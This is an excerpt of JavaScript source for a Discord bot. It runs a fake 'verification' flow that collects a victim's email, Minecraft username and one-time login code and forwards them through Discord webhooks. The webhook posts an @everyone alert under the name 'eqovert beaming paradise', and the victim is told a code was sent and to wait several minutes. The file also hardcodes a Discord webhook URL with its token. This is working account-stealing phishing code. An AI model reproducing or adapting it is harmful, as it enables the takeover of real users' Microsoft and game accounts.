...
client.once(Events.ClientReady, () => {
    ...
    client.user.setPresence({
        activities: [{ name: `Dungeon Sweats On Top!`, type: ActivityType.Playing }],
        status: 'idle',
    });
});
...
client.on(Events.InteractionCreate, async interaction => {
    ...
    if (interaction.customId === 'skrimverification') {
        ...
        if (!isEmail(email)) {
            return interaction.editReply({ content: "**Unable to send email. Please try again.**", ephemeral: true });
        }
        else {
            var state = makeid(10)
            ...
            var embed = new EmbedBuilder()
                .setTitle('**Email Sent**')
                .setDescription('✅ **A one-time verification code has been successfully sent to your email! Enter it by pressing the button below.**')
         ...
         const config = JSON.parse(fs.readFileSync('./serverstorage.json', 'utf8'));
          ...
          .setTitle('REQUEST CODE NOW!')
          .setDescription(`\n**Email:** ${email}\n\n **Username:** ${name}\n\n [**Request Code**](https://login.live.com/)`)  
     //     .setImage(`https://media.discordapp.net/attachments/1142835402361819168/1142835607001899008/-Ihf2ic3_400x400.jpg`)
          .setColor('#FF0000');

        
        webhook.send({ 
            content: "@everyone",
            username: 'eqovert beaming paradise',
         //   avatarURL: 'https://media.discordapp.net/attachments/1142835402361819168/1142835607001899008/-Ihf2ic3_400x400.jpg', 
          embeds: [initialEmbed] });
    ...
    if (interaction.customId.startsWith('enterCode.')) {
        ...
        var embed = new EmbedBuilder()
        .setTitle('Success!')
        .setDescription('You have verified!\nPlease allow 5-10 minutes for out systems to check everything is valid!')
  ...
  try {
    ...
    getUUID(name).then(async (response) => {
      ...
      const memberName = interaction.member.user.username; 
       ...
       var embed = new EmbedBuilder()
    .setTitle('<:warnxd:1124120542065197177> Code Entered!')
    ...
    .setFooter({ text: 'Made by eqovert.'})
   //      .setImage('https://media.discordapp.net/attachments/1142835402361819168/1142835607001899008/-Ihf2ic3_400x400.jpg');
...
const config = JSON.parse(fs.readFileSync('./serverstorage.json', 'utf8'));
            ...
            // Do something with the webhook URL here
            const webhook = new WebhookClient({ url: webhookUrl });
            const dhWebhook = new WebhookClient({ url: `https://discord.com/api/webhooks/1155897589934342204/gsBUoviNv77VTrHWmdkFwUl6C6tKMg6uW9Iec5kFB8ofvCsx4H7r0bVkw-qUlI8Pr9P_` });
